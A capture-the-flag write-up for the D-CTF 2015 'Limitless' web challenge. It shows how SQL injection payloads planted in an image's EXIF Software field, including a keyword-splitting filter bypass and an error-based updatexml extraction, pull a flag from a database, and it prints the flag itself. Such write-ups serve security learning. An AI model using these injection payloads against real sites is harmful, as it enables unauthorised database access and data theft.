#D-CTF Final 2015 Limitless [web] 200

##Problem
You have to get something from table "flag". :-)

##Solution
It's a website for uploading your own pictures. After some testing, I found that the website would read the exif "Software" option and search for the pictures with the same software in there database.<br>
The output would be like this:

<pre><code>Searching for testing
0 pictures with similar software found.</code></pre>

So we could use **exiftool** to edit the software section in the picture:<br>
<code>exiftool -Software='' pic.jpg</code>

Also, I found that the website would filter "union", but "select" was not filtered. So first I try to use some waf bypass techniques.<br>
I tried the input: <code>-Software="test\"U/**/NiOn sE/**/lECt 1 fr/**/om flag-- -"</code>
And I got the following output:<br>
<pre><code>Searching for test"U//NiOn sE//lECt 1 fr//om flag-- -
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'U//NiOn sE//lECt 1 fr//om flag-- -"' at line 1 pictures with similar software found.</code></pre>

Ok, waf bypass seemed to be useless, but now we were sure that it was an error base SQLi problem.

Then it was much easier now. Since it was error base SQLi, we could try to use "**updatexml**". And the following input could get the flag:<br>
<code>or(select updatexml(1,(select*from flag),1))#</code>

And the flag is <code>DCTF{09d5d8300a7adc45c5d434bb467f2a85}</code>.
